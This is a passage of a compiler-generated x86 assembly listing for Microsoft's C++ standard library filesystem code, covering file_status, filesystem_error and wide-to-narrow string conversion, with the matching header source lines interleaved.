; 1941 :         void permissions(perms _Perms) noexcept {
; 1942 :             _Myperms = _Perms;
; 1943 :         }
; 1944 : 
; 1945 :         // [fs.file_status.obs], observers
; 1946 :         _NODISCARD file_type type() const noexcept {
; 1947 :             return _Myftype;
; 1948 :         }
; 1949 : 
; 1950 :         _NODISCARD perms permissions() const noexcept {
; 1951 :             return _Myperms;
; 1952 :         }
; 1953 : 
; 1954 : #if _HAS_CXX20
; 1955 :         _NODISCARD_FRIEND bool operator==(const file_status& _Lhs, const file_status& _Rhs) noexcept {
; 1956 :             return _Lhs._Myftype == _Rhs._Myftype && _Lhs._Myperms == _Rhs._Myperms;
; 1957 :         }
; 1958 : #endif // _HAS_CXX20
; 1959 : 
; 1960 :         void _Refresh(const __std_win_error _Error, const __std_fs_stats& _Stats) noexcept {
; 1961 :             if (_Error == __std_win_error::_Success) {
; 1962 :                 const auto _Attrs = _Stats._Attributes;
; 1963 : 
; 1964 :                 if (_Bitmask_includes_any(_Attrs, __std_fs_file_attr::_Readonly)) {
; 1965 :                     this->permissions(perms::_File_attribute_readonly);
; 1966 :                 } else {
; 1967 :                     this->permissions(perms::all);
; 1968 :                 }
; 1969 : 
; 1970 :                 if (_Bitmask_includes_any(_Attrs, __std_fs_file_attr::_Reparse_point)) {
; 1971 :                     if (_Stats._Reparse_point_tag == __std_fs_reparse_tag::_Symlink) {
; 1972 :                         this->type(file_type::symlink);
; 1973 :                         return;
; 1974 :                     }
; 1975 : 
; 1976 :                     if (_Stats._Reparse_point_tag == __std_fs_reparse_tag::_Mount_point) {
; 1977 :                         this->type(file_type::junction);
; 1978 :                         return;
; 1979 :                     }
; 1980 : 
; 1981 :                     // All other reparse points considered ordinary files or directories
; 1982 :                 }
; 1983 : 
; 1984 :                 if (_Bitmask_includes_any(_Attrs, __std_fs_file_attr::_Directory)) {
; 1985 :                     this->type(file_type::directory);
; 1986 :                 } else {
; 1987 :                     this->type(file_type::regular);
; 1988 :                 }
; 1989 : 
; 1990 :                 return;
; 1991 :             }
; 1992 : 
; 1993 :             this->permissions(perms::unknown);
; 1994 :             this->type(__std_is_file_not_found(_Error) ? file_type::not_found : file_type::none);
; 1995 :         }
; 1996 : 
; 1997 :     private:
; 1998 :         file_type _Myftype = file_type::none;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0

; 1999 :         perms _Myperms     = perms::unknown;

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	c7 41 04 ff ff
	00 00		 mov	 DWORD PTR [ecx+4], 65535 ; 0000ffffH

; 1926 :         file_status() noexcept = default;

  0001a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001d	8b e5		 mov	 esp, ebp
  0001f	5d		 pop	 ebp
  00020	c3		 ret	 0
??0file_status@filesystem@std@@QAE@XZ ENDP		; std::filesystem::file_status::file_status
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@ABVpath@12@@Z
_TEXT	SEGMENT
$T1 = -136						; size = 92
$T2 = -40						; size = 24
$T3 = -16						; size = 8
$T4 = -8						; size = 8
__Op$ = 8						; size = 4
__Error$ = 12						; size = 4
__Path1$ = 16						; size = 4
?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@ABVpath@12@@Z PROC ; std::filesystem::_Throw_fs_error, COMDAT

; 1827 :     [[noreturn]] inline void _Throw_fs_error(const char* _Op, __std_win_error _Error, const path& _Path1) {

  00000	53		 push	 ebx
  00001	8b dc		 mov	 ebx, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	83 e4 f8	 and	 esp, -8			; fffffff8H
  00009	83 c4 04	 add	 esp, 4
  0000c	55		 push	 ebp
  0000d	8b 6b 04	 mov	 ebp, DWORD PTR [ebx+4]
  00010	89 6c 24 04	 mov	 DWORD PTR [esp+4], ebp
  00014	8b ec		 mov	 ebp, esp
  00016	81 ec 88 00 00
	00		 sub	 esp, 136		; 00000088H

; 1828 :         _THROW(filesystem_error(_Op, _Path1, _Make_ec(_Error)));

  0001c	8b 43 0c	 mov	 eax, DWORD PTR __Error$[ebx]
  0001f	50		 push	 eax
  00020	8d 4d f0	 lea	 ecx, DWORD PTR $T3[ebp]
  00023	51		 push	 ecx
  00024	e8 00 00 00 00	 call	 ?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z ; std::_Make_ec
  00029	83 c4 08	 add	 esp, 8
  0002c	8b 10		 mov	 edx, DWORD PTR [eax]
  0002e	8b 40 04	 mov	 eax, DWORD PTR [eax+4]
  00031	89 55 f8	 mov	 DWORD PTR $T4[ebp], edx
  00034	89 45 fc	 mov	 DWORD PTR $T4[ebp+4], eax
  00037	8b 4b 08	 mov	 ecx, DWORD PTR __Op$[ebx]
  0003a	51		 push	 ecx
  0003b	8d 4d d8	 lea	 ecx, DWORD PTR $T2[ebp]
  0003e	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00043	8b 55 fc	 mov	 edx, DWORD PTR $T4[ebp+4]
  00046	52		 push	 edx
  00047	8b 45 f8	 mov	 eax, DWORD PTR $T4[ebp]
  0004a	50		 push	 eax
  0004b	8b 4b 10	 mov	 ecx, DWORD PTR __Path1$[ebx]
  0004e	51		 push	 ecx
  0004f	8d 55 d8	 lea	 edx, DWORD PTR $T2[ebp]
  00052	52		 push	 edx
  00053	8d 8d 78 ff ff
	ff		 lea	 ecx, DWORD PTR $T1[ebp]
  00059	e8 00 00 00 00	 call	 ??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABVpath@12@Verror_code@2@@Z ; std::filesystem::filesystem_error::filesystem_error
  0005e	68 00 00 00 00	 push	 OFFSET __TI5?AVfilesystem_error@filesystem@std@@
  00063	8d 85 78 ff ff
	ff		 lea	 eax, DWORD PTR $T1[ebp]
  00069	50		 push	 eax
  0006a	e8 00 00 00 00	 call	 __CxxThrowException@8
  0006f	8d 4d d8	 lea	 ecx, DWORD PTR $T2[ebp]
  00072	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN1@Throw_fs_e:

; 1829 :     }

  00077	8b e5		 mov	 esp, ebp
  00079	5d		 pop	 ebp
  0007a	8b e3		 mov	 esp, ebx
  0007c	5b		 pop	 ebx
  0007d	c3		 ret	 0
?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@ABVpath@12@@Z ENDP ; std::filesystem::_Throw_fs_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@@Z
_TEXT	SEGMENT
$T1 = -144						; size = 92
$T2 = -48						; size = 24
$T3 = -24						; size = 8
$T4 = -16						; size = 8
$T5 = -8						; size = 8
__Op$ = 8						; size = 4
__Error$ = 12						; size = 4
?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@@Z PROC ; std::filesystem::_Throw_fs_error, COMDAT

; 1823 :     [[noreturn]] inline void _Throw_fs_error(const char* _Op, __std_win_error _Error) {

  00000	53		 push	 ebx
  00001	8b dc		 mov	 ebx, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	83 e4 f8	 and	 esp, -8			; fffffff8H
  00009	83 c4 04	 add	 esp, 4
  0000c	55		 push	 ebp
  0000d	8b 6b 04	 mov	 ebp, DWORD PTR [ebx+4]
  00010	89 6c 24 04	 mov	 DWORD PTR [esp+4], ebp
  00014	8b ec		 mov	 ebp, esp
  00016	81 ec 90 00 00
	00		 sub	 esp, 144		; 00000090H

; 1824 :         _THROW(filesystem_error(_Op, _Make_ec(_Error)));

  0001c	8b 43 0c	 mov	 eax, DWORD PTR __Error$[ebx]
  0001f	50		 push	 eax
  00020	8d 4d e8	 lea	 ecx, DWORD PTR $T3[ebp]
  00023	51		 push	 ecx
  00024	e8 00 00 00 00	 call	 ?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z ; std::_Make_ec
  00029	83 c4 08	 add	 esp, 8
  0002c	8b 10		 mov	 edx, DWORD PTR [eax]
  0002e	8b 40 04	 mov	 eax, DWORD PTR [eax+4]
  00031	89 55 f8	 mov	 DWORD PTR $T5[ebp], edx
  00034	89 45 fc	 mov	 DWORD PTR $T5[ebp+4], eax
  00037	8b 4d f8	 mov	 ecx, DWORD PTR $T5[ebp]
  0003a	8b 55 fc	 mov	 edx, DWORD PTR $T5[ebp+4]
  0003d	89 4d f0	 mov	 DWORD PTR $T4[ebp], ecx
  00040	89 55 f4	 mov	 DWORD PTR $T4[ebp+4], edx
  00043	8b 43 08	 mov	 eax, DWORD PTR __Op$[ebx]
  00046	50		 push	 eax
  00047	8d 4d d0	 lea	 ecx, DWORD PTR $T2[ebp]
  0004a	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  0004f	8b 4d f4	 mov	 ecx, DWORD PTR $T4[ebp+4]
  00052	51		 push	 ecx
  00053	8b 55 f0	 mov	 edx, DWORD PTR $T4[ebp]
  00056	52		 push	 edx
  00057	8d 45 d0	 lea	 eax, DWORD PTR $T2[ebp]
  0005a	50		 push	 eax
  0005b	8d 8d 70 ff ff
	ff		 lea	 ecx, DWORD PTR $T1[ebp]
  00061	e8 00 00 00 00	 call	 ??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@@Z ; std::filesystem::filesystem_error::filesystem_error
  00066	68 00 00 00 00	 push	 OFFSET __TI5?AVfilesystem_error@filesystem@std@@
  0006b	8d 8d 70 ff ff
	ff		 lea	 ecx, DWORD PTR $T1[ebp]
  00071	51		 push	 ecx
  00072	e8 00 00 00 00	 call	 __CxxThrowException@8
  00077	8d 4d d0	 lea	 ecx, DWORD PTR $T2[ebp]
  0007a	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN1@Throw_fs_e:

; 1825 :     }

  0007f	8b e5		 mov	 esp, ebp
  00081	5d		 pop	 ebp
  00082	8b e3		 mov	 esp, ebx
  00084	5b		 pop	 ebx
  00085	c3		 ret	 0
?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@@Z ENDP ; std::filesystem::_Throw_fs_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=<std::basic_string_view<char,std::char_traits<char> >,0>, COMDAT
; _this$ = ecx

; 3262 :     _CONSTEXPR20 basic_string& operator+=(const _StringViewIsh& _Right) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3263 :         return append(_Right);

  00007	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??$append@V?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append<std::basic_string_view<char,std::char_traits<char> >,0>

; 3264 :     }

  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c2 04 00	 ret	 4
??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=<std::basic_string_view<char,std::char_traits<char> >,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_wide_to_narrow_replace_chars@U?$char_traits@D@std@@V?$allocator@D@2@@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z
_TEXT	SEGMENT
$T1 = -68						; size = 8
$T2 = -60						; size = 8
tv141 = -52						; size = 4
tv143 = -48						; size = 4
__Data_as_char$3 = -44					; size = 4
tv88 = -40						; size = 4
tv90 = -36						; size = 4
__Len$4 = -32						; size = 4
__Output$ = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
__Code_page$ = 12					; size = 4
__Input$ = 16						; size = 8
__Al$ = 24						; size = 4
??$_Convert_wide_to_narrow_replace_chars@U?$char_traits@D@std@@V?$allocator@D@2@@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z PROC ; std::filesystem::_Convert_wide_to_narrow_replace_chars<std::char_traits<char>,std::allocator<char> >, COMDAT

; 63   :         const __std_code_page _Code_page, const wstring_view _Input, const _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 64   :         basic_string<typename _Traits::char_type, _Traits, _Alloc> _Output(_Al);

  00010	8b 45 18	 mov	 eax, DWORD PTR __Al$[ebp]
  00013	50		 push	 eax
  00014	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  00017	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >

; 65   : 
; 66   :         if (!_Input.empty()) {

  0001c	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  0001f	e8 00 00 00 00	 call	 ?empty@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBE_NXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::empty
  00024	0f b6 c8	 movzx	 ecx, al
  00027	85 c9		 test	 ecx, ecx
  00029	0f 85 b8 00 00
	00		 jne	 $LN2@Convert_wi

; 67   :             if (_Input.size() > static_cast<size_t>(INT_MAX)) {

  0002f	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00032	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  00037	3d ff ff ff 7f	 cmp	 eax, 2147483647		; 7fffffffH
  0003c	76 07		 jbe	 SHORT $LN3@Convert_wi

; 68   :                 _Throw_system_error(errc::invalid_argument);

  0003e	6a 16		 push	 22			; 00000016H
  00040	e8 00 00 00 00	 call	 ?_Throw_system_error@std@@YAXW4errc@1@@Z ; std::_Throw_system_error
$LN3@Convert_wi:

; 69   :             }
; 70   : 
; 71   :             const int _Len = _Check_convert_result(__std_fs_convert_wide_to_narrow_replace_chars(

  00045	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00048	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  0004d	89 45 dc	 mov	 DWORD PTR tv90[ebp], eax
  00050	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00053	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  00058	89 45 d8	 mov	 DWORD PTR tv88[ebp], eax
  0005b	6a 00		 push	 0
  0005d	6a 00		 push	 0
  0005f	8b 55 dc	 mov	 edx, DWORD PTR tv90[ebp]
  00062	52		 push	 edx
  00063	8b 45 d8	 mov	 eax, DWORD PTR tv88[ebp]
  00066	50		 push	 eax
  00067	8b 4d 0c	 mov	 ecx, DWORD PTR __Code_page$[ebp]
  0006a	51		 push	 ecx
  0006b	e8 00 00 00 00	 call	 ___std_fs_convert_wide_to_narrow_replace_chars@20
  00070	89 45 c4	 mov	 DWORD PTR $T2[ebp], eax
  00073	89 55 c8	 mov	 DWORD PTR $T2[ebp+4], edx
  00076	8b 55 c8	 mov	 edx, DWORD PTR $T2[ebp+4]
  00079	52		 push	 edx
  0007a	8b 45 c4	 mov	 eax, DWORD PTR $T2[ebp]
  0007d	50		 push	 eax
  0007e	e8 00 00 00 00	 call	 ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
  00083	83 c4 08	 add	 esp, 8
  00086	89 45 e0	 mov	 DWORD PTR __Len$4[ebp], eax

; 72   :                 _Code_page, _Input.data(), static_cast<int>(_Input.size()), nullptr, 0));
; 73   : 
; 74   :             _Output.resize(static_cast<size_t>(_Len));

  00089	6a 00		 push	 0
  0008b	8b 4d e0	 mov	 ecx, DWORD PTR __Len$4[ebp]
  0008e	51		 push	 ecx
  0008f	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  00092	e8 00 00 00 00	 call	 ?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize

; 75   : 
; 76   :             const auto _Data_as_char = reinterpret_cast<char*>(_Output.data());

  00097	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  0009a	e8 00 00 00 00	 call	 ?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEPADXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::data
  0009f	89 45 d4	 mov	 DWORD PTR __Data_as_char$3[ebp], eax

; 77   : 
; 78   :             (void) _Check_convert_result(__std_fs_convert_wide_to_narrow_replace_chars(

  000a2	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  000a5	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  000aa	89 45 d0	 mov	 DWORD PTR tv143[ebp], eax
  000ad	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  000b0	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  000b5	89 45 cc	 mov	 DWORD PTR tv141[ebp], eax
  000b8	8b 55 e0	 mov	 edx, DWORD PTR __Len$4[ebp]
  000bb	52		 push	 edx
  000bc	8b 45 d4	 mov	 eax, DWORD PTR __Data_as_char$3[ebp]
  000bf	50		 push	 eax
  000c0	8b 4d d0	 mov	 ecx, DWORD PTR tv143[ebp]
  000c3	51		 push	 ecx
  000c4	8b 55 cc	 mov	 edx, DWORD PTR tv141[ebp]
  000c7	52		 push	 edx
  000c8	8b 45 0c	 mov	 eax, DWORD PTR __Code_page$[ebp]
  000cb	50		 push	 eax
  000cc	e8 00 00 00 00	 call	 ___std_fs_convert_wide_to_narrow_replace_chars@20
  000d1	89 45 bc	 mov	 DWORD PTR $T1[ebp], eax
  000d4	89 55 c0	 mov	 DWORD PTR $T1[ebp+4], edx
  000d7	8b 4d c0	 mov	 ecx, DWORD PTR $T1[ebp+4]
  000da	51		 push	 ecx
  000db	8b 55 bc	 mov	 edx, DWORD PTR $T1[ebp]
  000de	52		 push	 edx
  000df	e8 00 00 00 00	 call	 ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
  000e4	83 c4 08	 add	 esp, 8
$LN2@Convert_wi:

; 79   :                 _Code_page, _Input.data(), static_cast<int>(_Input.size()), _Data_as_char, _Len));
; 80   :         }
; 81   : 
; 82   :         return _Output;

  000e7	8d 45 e4	 lea	 eax, DWORD PTR __Output$[ebp]
  000ea	50		 push	 eax
  000eb	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  000ee	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  000f3	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  000f6	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  000fb	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN1@Convert_wi:

; 83   :     }

  000fe	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00101	33 cd		 xor	 ecx, ebp
  00103	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00108	8b e5		 mov	 esp, ebp
  0010a	5d		 pop	 ebp
  0010b	c3		 ret	 0
??$_Convert_wide_to_narrow_replace_chars@U?$char_traits@D@std@@V?$allocator@D@2@@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ENDP ; std::filesystem::_Convert_wide_to_narrow_replace_chars<std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gfilesystem_error@filesystem@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gfilesystem_error@filesystem@std@@UAEPAXI@Z PROC	; std::filesystem::filesystem_error::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1filesystem_error@filesystem@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 5c		 push	 92			; 0000005cH
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gfilesystem_error@filesystem@std@@UAEPAXI@Z ENDP	; std::filesystem::filesystem_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0filesystem_error@filesystem@std@@QAE@ABV012@@Z
_TEXT	SEGMENT
tv141 = -16						; size = 4
tv132 = -12						; size = 4
tv91 = -8						; size = 4
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0filesystem_error@filesystem@std@@QAE@ABV012@@Z PROC	; std::filesystem::filesystem_error::filesystem_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00010	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@ABV01@@Z
  00015	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00018	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7filesystem_error@filesystem@std@@6B@
  0001e	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00021	83 c2 14	 add	 edx, 20			; 00000014H
  00024	89 55 f8	 mov	 DWORD PTR tv91[ebp], edx
  00027	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0002a	83 c0 14	 add	 eax, 20			; 00000014H
  0002d	50		 push	 eax
  0002e	8b 4d f8	 mov	 ecx, DWORD PTR tv91[ebp]
  00031	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::path::path
  00036	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00039	83 c1 2c	 add	 ecx, 44			; 0000002cH
  0003c	89 4d f4	 mov	 DWORD PTR tv132[ebp], ecx
  0003f	8b 55 08	 mov	 edx, DWORD PTR ___that$[ebp]
  00042	83 c2 2c	 add	 edx, 44			; 0000002cH
  00045	52		 push	 edx
  00046	8b 4d f4	 mov	 ecx, DWORD PTR tv132[ebp]
  00049	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::path::path
  0004e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00051	83 c0 44	 add	 eax, 68			; 00000044H
  00054	89 45 f0	 mov	 DWORD PTR tv141[ebp], eax
  00057	8b 4d 08	 mov	 ecx, DWORD PTR ___that$[ebp]
  0005a	83 c1 44	 add	 ecx, 68			; 00000044H
  0005d	51		 push	 ecx
  0005e	8b 4d f0	 mov	 ecx, DWORD PTR tv141[ebp]
  00061	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00066	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00069	8b e5		 mov	 esp, ebp
  0006b	5d		 pop	 ebp
  0006c	c2 04 00	 ret	 4
??0filesystem_error@filesystem@std@@QAE@ABV012@@Z ENDP	; std::filesystem::filesystem_error::filesystem_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1filesystem_error@filesystem@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1filesystem_error@filesystem@std@@UAE@XZ PROC		; std::filesystem::filesystem_error::~filesystem_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	83 c1 44	 add	 ecx, 68			; 00000044H
  0000d	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	83 c1 2c	 add	 ecx, 44			; 0000002cH
  00018	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  0001d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00020	83 c1 14	 add	 ecx, 20			; 00000014H
  00023	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  00028	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002b	e8 00 00 00 00	 call	 ??1system_error@std@@UAE@XZ
  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c3		 ret	 0
